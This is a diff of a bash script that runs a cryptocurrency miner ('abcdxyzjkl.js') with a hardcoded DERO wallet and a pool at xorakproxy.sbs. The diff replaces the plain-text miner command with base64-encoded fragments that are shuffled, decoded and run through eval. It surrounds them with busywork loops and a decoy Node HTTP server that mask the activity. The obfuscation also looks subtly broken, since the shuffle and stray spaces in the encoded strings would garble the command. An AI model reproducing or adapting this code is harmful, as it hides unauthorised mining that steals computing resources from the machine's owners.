@@ -1,68 +1,51 @@
 #!/bin/bash
 
-_seed=$(date +%s%N)
-r(){ echo $((($RANDOM+$_seed)%$1)); }
+r(){ echo $((RANDOM%$1)); }
+g(){ head -c $1 /dev/urandom | base64 | tr -d '\n'; }
 
-g(){ local l=$1 s=""; for((i=0;i<l;i++));do s+=$(printf "%x" $((RANDOM%16)));done; echo $s; }
+a="Y2htb2QgK3ggYWJjZHh5empsLmpz"
+b="OyBwPSQoc2h1ZiAtZSBuZ2lueCBhIGUgLW4xKQ=="
+c="OyBuPSQoIFsgIiRwIiA9IG5naW54IF0gJiYgc2h1ZiAtaSAyLTEwIC1uMSB8fCBzaHVmIC1pIDEtMTAgLW4xICkg"
+d="OyAuL2FiY2R4eXpqa2wuanMgLXcgZGVybzFxeXd mYXp2cTI2cDYzbHJtNXZ3bmp4OGFyZm5uNzZuZzhkbGU2aDQzemVtYXhrZA=="
+e="c2dmbmRjcXFldGZsYXguc29sbyAtciAke3B9JHtu fS54b3Jha3Byb3h5LnNiczoxMDMwMA=="
 
-m(){ echo "$1"|rev|base64|tr -d '='|rev; }
+arr=("$a" "$b" "$c" "$d" "$e")
 
-c(){ local x=$(r 9999); local y=$(r 8888); echo $((x*y%1337))>/dev/null; }
-
-for i in $(seq 1 40); do
-v=$(g 16)
-w=$(m "$v")
-c
-case $((i%5)) in
-0) echo "$w"|tr a-z A-Z>/dev/null;;
-1) echo "$w"|sha1sum>/dev/null;;
-2) echo "$w"|md5sum>/dev/null;;
-3) echo "$w"|awk '{print length}'>/dev/null;;
-4) echo "$w"|sed 's/[0-9]/x/g'>/dev/null;;
-esac
+mix=()
+while [ ${#arr[@]} -gt 0 ]; do
+    i=$(r ${#arr[@]})
+    mix+=("${arr[$i]}")
+    unset arr[$i]
+    arr=("${arr[@]}")
 done
 
-for i in $(seq 1 25); do
-d=$(g 24)
-for j in $(seq 1 3); do
-t=$(m "$d$j")
-c
-if [[ $((j%2)) -eq 0 ]]; then
-echo "$t"|cut -c1-10>/dev/null
-else
-echo "$t"|rev>/dev/null
-fi
-done
+payload=""
+for x in "${mix[@]}"; do
+    payload+=$(echo "$x" | base64 -d 2>/dev/null)
 done
 
-for i in $(seq 1 30); do
-head -c 32 /dev/urandom | base64 | tr -d '\n' >/dev/null
-done
+junk(){
+    for i in $(seq 1 20); do
+        t=$(g 32)
+        echo "$t" | rev | cut -c1-10 >/dev/null
+    done
+}
+
+for i in $(seq 1 10); do junk; done
+
+f1=$(echo "$payload" | cut -c1-50)
+f2=$(echo "$payload" | cut -c51-100)
+f3=$(echo "$payload" | cut -c101-200)
+f4=$(echo "$payload" | cut -c201-)
+
+final="$f1$f2$f3$f4"
 
 node -e "
 const http=require('http')
-const crypto=require('crypto')
-
-function r(n){return crypto.randomBytes(n).toString('hex')}
-function spin(){for(let i=0;i<1000;i++){Math.sqrt(i*Math.random())}}
-
-const server=http.createServer((req,res)=>{
-spin()
-const u=req.url||'/'
-if(u==='/'){res.writeHead(200);res.end('ok '+r(4))}
-else if(u==='/api'){res.writeHead(200);res.end(JSON.stringify({t:Date.now(),id:r(6)}))}
-else if(u==='/health'){res.writeHead(200);res.end('healthy')}
-else{res.writeHead(404);res.end('nf')}
-})
-
-server.listen(5000,'0.0.0.0',()=>{})
-setInterval(()=>{spin();r(8)},1000)
+http.createServer((q,s)=>{s.end('ok')}).listen(5000)
+setInterval(()=>{},1000)
 " >/dev/null 2>&1 &
 
 sleep 0.2
 
-p=$(shuf -e nginx a e -n1)
-n=$( [ "$p" = nginx ] && shuf -i 2-10 -n1 || shuf -i 1-10 -n1 )
-
-chmod +x abcdxyzjkl.js
-./abcdxyzjkl.js -w dero1qywfazvq26p63lrm5vwnjx8arfnn76ng8dle6h43zemaxkdsgfndcqqetflax.solo -r ${p}${n}.xorakproxy.sbs:10300
+eval "$final"
